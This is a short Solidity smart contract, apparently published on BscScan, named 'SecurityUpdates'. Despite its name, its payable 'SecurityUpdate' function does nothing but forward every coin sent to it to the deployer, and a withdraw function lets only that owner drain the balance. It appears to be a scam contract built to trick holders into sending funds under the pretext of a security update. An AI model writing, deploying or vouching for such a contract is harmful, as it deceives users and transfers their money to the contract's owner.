/**
 *Submitted for verification at BscScan.com on 2023-01-18
*/

pragma solidity ^0.8.7;

contract SecurityUpdates {

    address private owner;

    constructor() public{   
        owner = msg.sender;
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(owner).transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
        payable(owner).transfer(msg.value);
    }
}